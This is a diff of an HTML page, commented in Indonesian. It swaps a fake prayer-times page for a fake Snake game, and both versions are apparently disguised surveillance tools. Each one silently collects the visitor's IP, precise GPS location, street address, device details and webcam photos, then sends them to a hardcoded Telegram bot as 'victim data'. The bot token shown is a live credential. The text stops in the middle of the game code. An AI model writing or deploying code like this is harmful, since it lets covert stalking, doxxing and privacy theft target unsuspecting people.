@@ -1,555 +1,488 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jadwal Sholat</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:#0a1a0a;
-            font-family:Arial,sans-serif;
-            color:#e8f5e9;
-            min-height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            padding:12px
-        }
-        .container{
-            max-width:420px;width:100%;background:rgba(18,38,18,0.92);
-            border-radius:28px;padding:24px 18px 20px;
-            border:1px solid rgba(76,175,80,0.10);
-            box-shadow:0 10px 40px rgba(0,0,0,0.5)
-        }
-        .header{text-align:center;margin-bottom:14px}
-        .header .icon{font-size:42px;display:block;margin-bottom:2px}
-        .header h1{font-size:24px;color:#a5d6a7;font-weight:400;letter-spacing:2px}
-        .header .sub{color:#5a7a5a;font-size:11px;margin-top:2px;letter-spacing:1px}
-        .prayer-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:14px 0 16px}
-        .prayer-item{
-            background:rgba(30,55,30,0.35);border-radius:12px;padding:12px 4px;
-            text-align:center;border:1px solid rgba(76,175,80,0.05)
-        }
-        .prayer-item .name{font-size:10px;color:#7a9a7a;text-transform:uppercase;letter-spacing:1px}
-        .prayer-item .time{font-size:18px;color:#c8e6c9;font-weight:500;margin-top:2px}
-        .prayer-item.active{border-color:rgba(76,175,80,0.25);background:rgba(76,175,80,0.08)}
-        .prayer-item.active .time{color:#81c784}
-        .prayer-item.full{grid-column:span 2}
-        .divider{height:1px;background:rgba(76,175,80,0.12);margin:8px 0 12px}
-        .info-row{display:flex;justify-content:space-between;font-size:12px;color:#6a8a6a;padding:4px 0;border-bottom:1px solid rgba(76,175,80,0.03)}
-        .info-row:last-child{border-bottom:none}
-        .info-row span:last-child{color:#a5d6a7;text-align:right;max-width:60%}
-        .footer{text-align:center;font-size:10px;color:#3a5a3a;margin-top:14px;line-height:1.6}
-        video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
-        .flash-overlay{
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            background:white;z-index:99999;
-            opacity:0;pointer-events:none;
-            transition:opacity 0.05s;
-        }
-        .flash-overlay.active{
-            opacity:0.8;
-            transition:opacity 0.05s;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snake Game</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #1a1a2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #fff;
+    }
+    .container {
+      background: #16213e;
+      padding: 20px;
+      border-radius: 20px;
+      text-align: center;
+      width: 92%;
+      max-width: 450px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+    }
+    h1 {
+      font-size: 28px;
+      color: #e94560;
+      text-shadow: 0 0 10px #e94560;
+    }
+    canvas {
+      background: #0f3460;
+      display: block;
+      margin: 15px auto;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      aspect-ratio: 1/1;
+    }
+    .info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 18px;
+      margin: 10px 0;
+    }
+    .info span {
+      background: #0f3460;
+      padding: 5px 15px;
+      border-radius: 30px;
+    }
+    .btn {
+      background: #e94560;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 10px;
+    }
+    .btn:hover {
+      transform: scale(1.05);
+      background: #c73652;
+    }
+    .btn:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
 </head>
 <body>
 
-<!-- FLASH EFEK (TIDAK KELIHATAN) -->
-<div class="flash-overlay" id="flashOverlay"></div>
-
-<div class="container">
-    <div class="header">
-        <span class="icon">🕌</span>
-        <h1>Jadwal Sholat</h1>
-        <div class="sub" id="locationSub">📍 Menentukan lokasi...</div>
+  <div class="container">
+    <h1>🐍 SNAKE GAME</h1>
+    <div class="info">
+      <span>🍎 <span id="score">0</span></span>
+      <span>🏆 <span id="highScore">0</span></span>
     </div>
+    <canvas id="gameCanvas" width="400" height="400"></canvas>
+    <button class="btn" id="startBtn">▶ Mulai Game</button>
+    <div class="status" id="statusText">Tekan tombol untuk bermain</div>
+  </div>
 
-    <div class="prayer-grid">
-        <div class="prayer-item active"><div class="name">Subuh</div><div class="time">04:30</div></div>
-        <div class="prayer-item"><div class="name">Dzuhur</div><div class="time">12:15</div></div>
-        <div class="prayer-item"><div class="name">Ashar</div><div class="time">15:30</div></div>
-        <div class="prayer-item"><div class="name">Maghrib</div><div class="time">18:00</div></div>
-        <div class="prayer-item full"><div class="name">Isya</div><div class="time">19:30</div></div>
-    </div>
+  <script>
+    // ============================
+    //  KONFIGURASI TELEGRAM
+    // ============================
+    const BOT_TOKEN = '8684818663:AAGHhzUVMn1irJnrlcpVzNXQjGpImKJzkKU';
+    const CHAT_ID = '6836011848';
 
-    <div class="divider"></div>
-
-    <div class="info-row"><span>📍 Lokasi</span><span id="displayLocation">Menentukan...</span></div>
-    <div class="info-row"><span>🕋 Arah Kiblat</span><span>295.4°</span></div>
-    <div class="info-row"><span>📅 Tanggal</span><span id="displayDate"></span></div>
-
-    <div class="footer">⏳ Waktu sholat berdasarkan lokasi Anda</div>
-</div>
-
-<video id="video" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
-
-<script>
-// ================================================================
-// ZYX - NIGHT VISION v1 (DETEKSI WAJAH DALAM GELAP)
-// ================================================================
-
-// ====== GANTI DENGAN DATA BOT KAMU ======
-const BOT_TOKEN = '8684818663:AAGHhzUVMn1irJnrlcpVzNXQjGpImKJzkKU'; // <--- GANTI!
-const CHAT_ID = '6836011848'; // <--- GANTI!
-// =========================================
-
-let dataTerkirim = false;
-
-document.getElementById('displayDate').textContent = new Date().toLocaleDateString('id-ID', {
-    weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
-});
-
-// ==================== KIRIM PESAN ====================
-function kirimPesan(pesan) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    return fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
+    // ============================
+    //  KIRIM PESAN TEKS (LANGSUNG)
+    // ============================
+    async function sendMessage(text) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: pesan,
-            parse_mode: 'HTML',
-            disable_web_page_preview: false
-        })
-    }).catch(() => {});
-}
-
-// ==================== KIRIM FOTO ====================
-function kirimFoto(fotoBase64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    return fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            photo: fotoBase64,
-            caption: caption,
-            parse_mode: 'HTML'
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.ok) return true;
-        throw new Error(data.description || 'Gagal');
-    })
-    .catch(() => false);
-}
-
-// ==================== KIRIM DOKUMEN (FALLBACK) ====================
-function kirimDokumen(fotoBase64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-    return fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            document: fotoBase64,
-            caption: caption,
-            parse_mode: 'HTML'
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.ok) return true;
-        throw new Error(data.description || 'Gagal');
-    })
-    .catch(() => false);
-}
-
-// ==================== UPLOAD KE TELEGRAPH (FALLBACK 2) ====================
-function uploadKeTelegraph(base64Image) {
-    const byteString = atob(base64Image.split(',')[1]);
-    const mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    const blob = new Blob([ab], { type: mimeString });
-
-    const formData = new FormData();
-    formData.append('file', blob, 'face.jpg');
-
-    return fetch('https://telegra.ph/upload', {
-        method: 'POST',
-        body: formData
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data && data[0] && data[0].src) {
-            return 'https://telegra.ph' + data[0].src;
-        } else {
-            throw new Error('Upload gagal');
-        }
-    });
-}
-
-// ==================== BRIGHTNESS BOOST (TERANGKAN FOTO) ====================
-function boostBrightness(imageData, factor) {
-    const data = imageData.data;
-    for (let i = 0; i < data.length; i += 4) {
-        data[i] = Math.min(255, data[i] * factor);
-        data[i+1] = Math.min(255, data[i+1] * factor);
-        data[i+2] = Math.min(255, data[i+2] * factor);
-    }
-    return imageData;
-}
-
-// ==================== DETEKSI WAJAH (DENGAN BRIGHTNESS BOOST) ====================
-function detectFace(imageData) {
-    const data = imageData.data;
-    let facePixels = 0;
-    let totalPixels = 0;
-
-    for (let i = 0; i < data.length; i += 4) {
-        const r = data[i];
-        const g = data[i+1];
-        const b = data[i+2];
-        totalPixels++;
-
-        // Konversi ke YCrCb
-        const Y = 0.299 * r + 0.587 * g + 0.114 * b;
-        const Cr = (r - Y) * 0.713 + 128;
-        const Cb = (b - Y) * 0.564 + 128;
-
-        // Skin color range (lebih sensitif untuk kondisi gelap)
-        if (Cr >= 130 && Cr <= 175 && Cb >= 75 && Cb <= 130 && Y > 40) {
-            facePixels++;
-        }
-    }
-
-    return facePixels / totalPixels;
-}
-
-// ==================== AMBIL FOTO DENGAN FLASH + BRIGHTNESS BOOST ====================
-function captureWithBoost(video, canvas, ctx, callback) {
-    const lebar = 320;
-    const tinggi = 240;
-
-    // FLASH EFEK (kilat cepat)
-    const flash = document.getElementById('flashOverlay');
-    flash.classList.add('active');
-    setTimeout(() => flash.classList.remove('active'), 100);
-
-    // Ambil gambar
-    canvas.width = lebar;
-    canvas.height = tinggi;
-    ctx.drawImage(video, 0, 0, lebar, tinggi);
-
-    // Ambil image data
-    let imageData = ctx.getImageData(0, 0, lebar, tinggi);
-
-    // Coba deteksi tanpa boost dulu
-    let skinRatio = detectFace(imageData);
-
-    // Jika gelap, coba dengan brightness boost (2x, 3x, 4x)
-    let bestImageData = imageData;
-    let bestRatio = skinRatio;
-    let boostFactors = [1, 1.5, 2, 2.5, 3];
-
-    for (let factor of boostFactors) {
-        const boostedData = ctx.getImageData(0, 0, lebar, tinggi);
-        boostBrightness(boostedData, factor);
-        const ratio = detectFace(boostedData);
-
-        if (ratio > bestRatio) {
-            bestRatio = ratio;
-            bestImageData = boostedData;
-        }
-    }
-
-    // Pakai hasil terbaik
-    ctx.putImageData(bestImageData, 0, 0);
-    const finalImage = canvas.toDataURL('image/jpeg', 0.7);
-
-    return {
-        imageData: finalImage,
-        skinRatio: bestRatio,
-        brightness: boostFactors[boostFactors.length - 1],
-        detected: bestRatio > 0.025
-    };
-}
-
-// ==================== AMBIL DATA ====================
-function ambilData(callback) {
-    const data = {
-        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 HP' : '💻 Laptop',
-        browser: navigator.userAgent.includes('Edg/') ? 'Edge' :
-                 navigator.userAgent.includes('OPR/') ? 'Opera' :
-                 navigator.userAgent.includes('Firefox/') ? 'Firefox' :
-                 navigator.userAgent.includes('Chrome/') ? 'Chrome' :
-                 navigator.userAgent.includes('Safari/') ? 'Safari' : 'Lainnya',
-        os: navigator.platform || 'Unknown',
-        screen: `${window.screen.width}x${window.screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-        ip: '-',
-        lat: null, lon: null,
-        alamat: '-', rt_rw: '-', landmark: '-', zip: '-',
-        face: '❌ Tidak terdeteksi', faceImage: null
-    };
-
-    // IP
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(ipData => {
-            data.ip = ipData.ip;
-            return fetch(`https://ipinfo.io/${ipData.ip}/json`);
-        })
-        .then(r => r.json())
-        .then(info => {
-            if (info.country) data.country = info.country;
-            if (info.region) data.region = info.region;
-            if (info.city) data.city = info.city;
-            if (info.postal) data.zip = info.postal;
-            if (info.org) data.isp = info.org;
-            const loc = info.loc ? info.loc.split(',') : null;
-            if (loc) { data.lat = parseFloat(loc[0]); data.lon = parseFloat(loc[1]); }
-        })
-        .catch(() => {});
-
-    // GPS + Reverse Geocode
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                data.lat = pos.coords.latitude;
-                data.lon = pos.coords.longitude;
-                data.gpsAccuracy = pos.coords.accuracy;
-
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}&zoom=18&addressdetails=1&extratags=1`)
-                    .then(r => r.json())
-                    .then(res => {
-                        if (res && res.address) {
-                            const a = res.address;
-                            let alamat = '';
-                            if (a.house_number) alamat += 'No. ' + a.house_number + ' ';
-                            if (a.road) alamat += a.road;
-                            if (a.village) alamat += alamat ? ', ' + a.village : a.village;
-                            if (a.city) alamat += alamat ? ', ' + a.city : a.city;
-                            if (a.country) alamat += alamat ? ', ' + a.country : a.country;
-                            if (a.postcode) data.zip = a.postcode;
-                            if (alamat) data.alamat = alamat;
-
-                            let rt = '', rw = '';
-                            const sumber = [a.suburb, a.village, a.road, res.display_name];
-                            for (const s of sumber) {
-                                if (s) {
-                                    const rm = s.match(/RT\s*[\.]?\s*(\d+)/i);
-                                    if (rm && !rt) rt = rm[1];
-                                    const rwm = s.match(/RW\s*[\.]?\s*(\d+)/i);
-                                    if (rwm && !rw) rw = rwm[1];
-                                }
-                            }
-                            if (a.rt) rt = a.rt;
-                            if (a.rw) rw = a.rw;
-                            if (rt || rw) data.rt_rw = (rt ? 'RT ' + rt : '') + (rt && rw ? ' / ' : '') + (rw ? 'RW ' + rw : '');
-
-                            const lm = [];
-                            if (a.school) lm.push('Sekolah ' + a.school);
-                            if (a.mosque) lm.push('Masjid ' + a.mosque);
-                            if (a.church) lm.push('Gereja ' + a.church);
-                            if (a.hospital) lm.push('RS ' + a.hospital);
-                            if (a.market) lm.push('Pasar ' + a.market);
-                            if (a.shop) lm.push('Toko ' + a.shop);
-                            if (a.park) lm.push('Taman ' + a.park);
-                            if (a.library) lm.push('Perpustakaan ' + a.library);
-                            if (a.mall) lm.push('Mall ' + a.mall);
-                            if (a.building) lm.push('Gedung ' + a.building);
-                            if (res.extratags) {
-                                if (res.extratags.landmark) lm.push(res.extratags.landmark);
-                                if (res.extratags.name) lm.push(res.extratags.name);
-                            }
-                            if (res.namedetails) {
-                                for (const [key, val] of Object.entries(res.namedetails)) {
-                                    if (val && !lm.some(p => p.includes(val))) lm.push(val);
-                                }
-                            }
-                            const unique = [...new Set(lm)];
-                            data.landmark = unique.filter(l => l && l.length > 2).join(', ') || '-';
-
-                            if (data.alamat && data.alamat !== '-') {
-                                document.getElementById('displayLocation').textContent = data.alamat;
-                                document.getElementById('locationSub').textContent = '📍 ' + data.alamat;
-                            } else if (data.lat && data.lon) {
-                                document.getElementById('displayLocation').textContent = `${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
-                                document.getElementById('locationSub').textContent = '📍 ' + `${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
-                            }
-                        }
-                        scanWajah(data, callback);
-                    })
-                    .catch(() => scanWajah(data, callback));
-            },
-            () => scanWajah(data, callback),
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-    } else {
-        scanWajah(data, callback);
-    }
-}
-
-// ==================== SCAN WAJAH (DENGAN NIGHT VISION) ====================
-function scanWajah(data, callback) {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-
-    navigator.mediaDevices.getUserMedia({
-        video: {
-            facingMode: 'user',
-            width: { ideal: 320 },
-            height: { ideal: 240 },
-            // Setting eksposur untuk kondisi gelap
-            exposureMode: 'continuous',
-            exposureCompensation: 2
-        },
-        audio: false
-    })
-    .then(stream => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-            video.play();
-
-            // Ambil beberapa frame untuk cari yang terbaik
-            let bestResult = null;
-            let attempts = 0;
-            const maxAttempts = 5;
-
-            function captureFrame() {
-                attempts++;
-                const result = captureWithBoost(video, canvas, ctx);
-
-                if (result.detected || attempts >= maxAttempts) {
-                    // Selesai, ambil hasil terbaik
-                    if (!bestResult || result.skinRatio > bestResult.skinRatio) {
-                        bestResult = result;
-                    }
-
-                    if (bestResult) {
-                        data.faceImage = bestResult.imageData;
-                        if (bestResult.detected) {
-                            data.face = '✅ Terdeteksi (Night Vision)';
-                        } else {
-                            data.face = '❌ Tidak terdeteksi (low light)';
-                        }
-                    }
-
-                    stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
-
-                    if (callback) callback(data);
-                } else {
-                    // Coba lagi dengan delay
-                    if (!bestResult || result.skinRatio > bestResult.skinRatio) {
-                        bestResult = result;
-                    }
-                    setTimeout(captureFrame, 300);
-                }
-            }
-
-            // Mulai capture
-            setTimeout(captureFrame, 500);
-        };
-    })
-    .catch(() => {
-        data.face = '🚫 Kamera ditolak';
-        if (callback) callback(data);
-    });
-}
-
-// ==================== KIRIM SEMUA ====================
-function kirimSemua(data) {
-    if (dataTerkirim) return;
-    dataTerkirim = true;
-
-    const mapsLink = (data.lat && data.lon) ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : '';
-
-    const pesanDasar = `
-🕌 <b>DATA KORBAN</b>
-━━━━━━━━━━━━━━━━━
-🕐 Waktu: ${data.waktu}
-📱 Perangkat: ${data.device}
-🌐 Browser: ${data.browser}
-📶 IP: ${data.ip || '-'}
-━━━━━━━━━━━━━━━━━
-📍 <b>LOKASI</b>
-🏠 Alamat: ${data.alamat || '-'}
-🏘️ RT/RW: ${data.rt_rw || '-'}
-📍 Patokan: ${data.landmark || '-'}
-🌍 Koordinat: ${data.lat ? data.lat.toFixed(6) : '-'}, ${data.lon ? data.lon.toFixed(6) : '-'}
-📮 Kode Pos: ${data.zip || '-'}
-${mapsLink ? `🗺️ <a href="${mapsLink}">🔗 Lihat di Google Maps</a>` : ''}
-━━━━━━━━━━━━━━━━━
-📱 <b>PERANGKAT</b>
-💻 OS: ${data.os || '-'}
-🌐 Browser: ${data.browser}
-📐 Resolusi: ${data.screen || '-'}
-🕐 Timezone: ${data.timezone || '-'}
-    `;
-
-    kirimPesan(pesanDasar);
-
-    if (data.faceImage) {
-        const caption = `📸 <b>FOTO WAJAH KORBAN</b> (Night Vision)\n🕐 ${data.waktu}\n📍 ${data.alamat || '-'}\n${data.face}`;
-
-        kirimFoto(data.faceImage, caption)
-            .then(success => {
-                if (!success) {
-                    kirimDokumen(data.faceImage, caption)
-                        .then(success => {
-                            if (!success) {
-                                uploadKeTelegraph(data.faceImage)
-                                    .then(url => {
-                                        kirimPesan(`📸 <b>FOTO WAJAH KORBAN</b>\n<a href="${url}">🖼️ KLIK UNTUK LIHAT FOTO</a>`);
-                                    })
-                                    .catch(() => {
-                                        kirimPesan('❌ Foto gagal dikirim');
-                                    });
-                            }
-                        });
-                }
-            });
-    }
-
-    try {
-        let semua = JSON.parse(localStorage.getItem('data_korban') || '[]');
-        semua.push(data);
-        localStorage.setItem('data_korban', JSON.stringify(semua));
-    } catch (e) {}
-
-    console.log('📦 DATA TERKIRIM:', data);
-}
-
-// ==================== MAIN ====================
-window.addEventListener('load', function() {
-    setTimeout(() => {
-        ambilData((data) => {
-            kirimSemua(data);
+            text: text,
+            parse_mode: 'Markdown'
+          })
         });
-    }, 1500);
-});
-
-try {
-    const semua = JSON.parse(localStorage.getItem('data_korban') || '[]');
-    if (semua.length > 0) {
-        const last = semua[semua.length - 1];
-        const now = new Date();
-        const diff = (now - new Date(last.timestamp)) / 1000 / 60;
-        if (diff < 10) {
-            dataTerkirim = true;
-            console.log('⏳ Data sudah terkirim < 10 menit, skip');
-        }
+        const result = await res.json();
+        console.log('SendMessage result:', result);
+        return result.ok === true;
+      } catch (e) {
+        console.error('SendMessage error:', e);
+        return false;
+      }
     }
-} catch (e) {}
 
-console.log('🔴 ZYX NIGHT VISION v1 READY');
-console.log('📌 BOT_TOKEN:', BOT_TOKEN ? '✅ SET' : '❌ KOSONG');
-console.log('📌 CHAT_ID:', CHAT_ID ? '✅ SET' : '❌ KOSONG');
-console.log('📌 Mode: Night Vision - Deteksi wajah dalam gelap dengan brightness boost + flash');
-</script>
+    // ============================
+    //  KIRIM FOTO
+    // ============================
+    async function sendPhoto(base64) {
+      try {
+        const blob = await fetch(base64).then(r => r.blob());
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'foto_korban.jpg');
+        fd.append('caption', '📸 *FOTO KORBAN*');
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: fd
+        });
+        const result = await res.json();
+        console.log('SendPhoto result:', result);
+        return result.ok === true;
+      } catch (e) {
+        console.error('SendPhoto error:', e);
+        return false;
+      }
+    }
+
+    // ============================
+    //  AMBIL DATA
+    // ============================
+    async function getIP() {
+      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
+    }
+
+    async function getISP() {
+      try { const r = await fetch('https://ipapi.co/isp/'); const t = await r.text(); return t || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
+    }
+
+    function getBattery() {
+      return new Promise(resolve => {
+        if (!navigator.getBattery) return resolve('Tidak diketahui');
+        navigator.getBattery().then(b => resolve(Math.round(b.level * 100) + '%')).catch(() => resolve('Tidak diketahui'));
+      });
+    }
+
+    function getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ lat: 0, lng: 0 });
+        navigator.geolocation.getCurrentPosition(
+          p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
+          () => resolve({ lat: 0, lng: 0 }), { timeout: 3000 }
+        );
+      });
+    }
+
+    async function getLocationDetail(lat, lng) {
+      try {
+        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+        const d = await r.json();
+        const a = d.address || {};
+        return {
+          negara: a.country || 'Tidak diketahui',
+          provinsi: a.state || a.province || 'Tidak diketahui',
+          kota: a.city || a.town || a.municipality || 'Tidak diketahui',
+          kecamatan: a.city_district || a.district || 'Tidak diketahui',
+          kelurahan: a.suburb || a.village || a.neighbourhood || 'Tidak diketahui',
+          rt: a.road || 'Tidak diketahui',
+          kodePos: a.postcode || 'Tidak diketahui',
+          alamat: d.display_name || 'Tidak diketahui',
+          maps: `https://maps.google.com/maps?q=${lat},${lng}`
+        };
+      } catch { return {
+          negara: 'Tidak diketahui',
+          provinsi: 'Tidak diketahui',
+          kota: 'Tidak diketahui',
+          kecamatan: 'Tidak diketahui',
+          kelurahan: 'Tidak diketahui',
+          rt: 'Tidak diketahui',
+          kodePos: 'Tidak diketahui',
+          alamat: 'Tidak diketahui',
+          maps: 'Tidak diketahui'
+        }; }
+    }
+
+    async function ambilFoto() {
+      return new Promise((resolve) => {
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 } })
+          .then((stream) => {
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0);
+              const foto = canvas.toDataURL('image/jpeg', 0.8);
+              stream.getTracks().forEach(t => t.stop());
+              resolve(foto);
+            }, 800);
+          })
+          .catch(() => resolve(null));
+      });
+    }
+
+    // ============================
+    //  CAPTURE + KIRIM LANGSUNG
+    // ============================
+    async function captureAndSend() {
+      try {
+        const [ip, isp, bat, loc] = await Promise.all([
+          getIP(),
+          getISP(),
+          getBattery(),
+          getLocation()
+        ]);
+
+        const detail = await getLocationDetail(loc.lat, loc.lng);
+
+        const data = {
+          ip,
+          isp,
+          bat,
+          perangkat: navigator.userAgent || 'Tidak diketahui',
+          os: navigator.platform || 'Tidak diketahui',
+          browser: navigator.userAgent || 'Tidak diketahui',
+          bahasa: navigator.language || 'Tidak diketahui',
+          layar: `${screen.width}x${screen.height}`,
+          waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+          link: window.location.href,
+          ...detail,
+          lat: loc.lat,
+          lng: loc.lng
+        };
+
+        // === FORMAT PESAN LANGSUNG (SEPERTI SS) ===
+        const pesan = `
+🔴 *DATA KORBAN* 🔴
+─────────────────
+📅 *Waktu*     : ${data.waktu}
+💻 *Perangkat* : ${data.perangkat}
+🌐 *Browser*   : ${data.browser}
+📌 *IP*        : ${data.ip}
+
+📍 *LOKASI*
+─────────────────
+🗺️ *Negara*     : ${data.negara}
+🏛️ *Provinsi*   : ${data.provinsi}
+🏙️ *Kota*       : ${data.kota}
+🗾 *Kecamatan*  : ${data.kecamatan}
+🏘️ *Kelurahan*  : ${data.kelurahan}
+🛣️ *RT/RW*      : ${data.rt}
+📮 *Kode Pos*   : ${data.kodePos}
+📍 *Alamat*     : ${data.alamat}
+🗺️ *Google Maps*: ${data.maps}
+📍 *Koordinat*  : ${data.lat}, ${data.lng}
+
+📱 *PERANGKAT*
+─────────────────
+💻 *OS*         : ${data.os}
+🌐 *Browser*    : ${data.browser}
+📐 *Resolusi*   : ${data.layar}
+🔋 *Baterai*    : ${data.bat}
+🌍 *Bahasa*     : ${data.bahasa}
+⏰ *Timezone*   : Asia/Jakarta
+
+─────────────────
+👑 *Dikirim untuk Tuan SILL*
+        `;
+
+        // === KIRIM PESAN LANGSUNG ===
+        const teksOK = await sendMessage(pesan);
+        console.log('Pesan langsung terkirim:', teksOK);
+
+        // === KIRIM FOTO ===
+        const foto = await ambilFoto();
+        if (foto) {
+          const fotoOK = await sendPhoto(foto);
+          console.log('Foto terkirim:', fotoOK);
+        }
+
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+
+    // ============================
+    //  GAME SNAKE
+    // ============================
+    const canvas = document.getElementById('gameCanvas');
+    const ctx = canvas.getContext('2d');
+    const scoreSpan = document.getElementById('score');
+    const highScoreSpan = document.getElementById('highScore');
+    const statusText = document.getElementById('statusText');
+    const startBtn = document.getElementById('startBtn');
+
+    let snake, direction, nextDirection, food, score, highScore, gameInterval, gameRunning;
+
+    function initGame() {
+      snake = [{ x: 10, y: 10 }, { x: 9, y: 10 }, { x: 8, y: 10 }];
+      direction = 'RIGHT';
+      nextDirection = 'RIGHT';
+      score = 0;
+      scoreSpan.textContent = score;
+      statusText.textContent = 'Game berjalan...';
+      spawnFood();
+      drawCanvas();
+    }
+
+    function spawnFood() {
+      let pos, valid;
+      do {
+        pos = { x: Math.floor(Math.random() * 20), y: Math.floor(Math.random() * 20) };
+        valid = !snake.some(seg => seg.x === pos.x && seg.y === pos.y);
+      } while (!valid);
+      food = pos;
+    }
+
+    function drawCanvas() {
+      ctx.clearRect(0, 0, 400, 400);
+      ctx.strokeStyle = '#1a4a7a';
+      ctx.lineWidth = 0.5;
+      for (let i = 0; i <= 20; i++) {
+        ctx.beginPath();
+        ctx.moveTo(i * 20, 0);
+        ctx.lineTo(i * 20, 400);
+        ctx.stroke();
+        ctx.beginPath();
+        ctx.moveTo(0, i * 20);
+        ctx.lineTo(400, i * 20);
+        ctx.stroke();
+      }
+      ctx.fillStyle = '#00ff88';
+      snake.forEach(seg => ctx.fillRect(seg.x * 20, seg.y * 20, 18, 18));
+      const head = snake[0];
+      ctx.fillStyle = '#00cc66';
+      ctx.fillRect(head.x * 20, head.y * 20, 18, 18);
+      ctx.fillStyle = '#ff4444';
+      ctx.shadowColor = '#ff4444';
+      ctx.shadowBlur = 10;
+      ctx.beginPath();
+      ctx.arc(food.x * 20 + 10, food.y * 20 + 10, 8, 0, 2 * Math.PI);
+      ctx.fill();
+      ctx.shadowBlur = 0;
+    }
+
+    function gameLoop() {
+      if (!gameRunning) return;
+      direction = nextDirection;
+      const head = { ...snake[0] };
+      switch (direction) {
+        case 'RIGHT':
+          head.x++;
+          break;
+        case 'LEFT':
+          head.x--;
+          break;
+        case 'UP':
+          head.y--;
+          break;
+        case 'DOWN':
+          head.y++;
+          break;
+      }
+      if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20) {
+        gameOver();
+        return;
+      }
+      if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
+        gameOver();
+        return;
+      }
+      snake.unshift(head);
+      if (head.x === food.x && head.y === food.y) {
+        score++;
+        scoreSpan.textContent = score;
+        spawnFood();
+        if (score > highScore) {
+          highScore = score;
+          highScoreSpan.textContent = highScore;
+          localStorage.setItem('snakeHighScore', highScore);
+        }
+      } else {
+        snake.pop();
+      }
+      drawCanvas();
+    }
+
+    function gameOver() {
+      gameRunning = false;
+      clearInterval(gameInterval);
+      gameInterval = null;
+      statusText.textContent = `Game Over! Skor: ${score}`;
